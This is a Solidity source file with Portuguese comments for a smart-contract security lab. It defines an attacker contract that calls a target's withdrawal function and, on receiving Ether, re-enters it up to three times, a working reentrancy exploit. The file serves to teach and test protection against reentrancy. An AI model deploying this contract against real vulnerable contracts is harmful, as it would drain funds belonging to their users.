// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

/// @title ContratoAtacante
/// @notice Contrato malicioso didático usado no Laboratório: recebe um crédito no
///         contrato-alvo e tenta sacá-lo várias vezes, reentrando na função de
///         saque enquanto o primeiro envio ainda está em andamento (ataque de
///         reentrância). Em contrato protegido, as reentradas são recusadas.
contract ContratoAtacante {
    address public alvo;
    bytes public chamada;
    uint256 public tentativas;
    bool public reentrouComSucesso;
    uint256 public recebido;

    /// @notice Define o contrato-alvo e a chamada de saque (ex.: sacar()).
    function configurar(address _alvo, bytes calldata _chamada) external {
        alvo = _alvo;
        chamada = _chamada;
    }

    /// @notice Inicia o ataque chamando a função de saque do alvo.
    function atacar() external {
        (bool ok, ) = alvo.call(chamada);
        require(ok, "saque inicial falhou");
    }

    /// @notice Ao receber Ether, tenta sacar de novo antes de o alvo atualizar o saldo.
    receive() external payable {
        recebido += msg.value;
        if (tentativas < 3) {
            tentativas += 1;
            (bool ok, ) = alvo.call(chamada);
            if (ok) reentrouComSucesso = true;
        }
    }
}
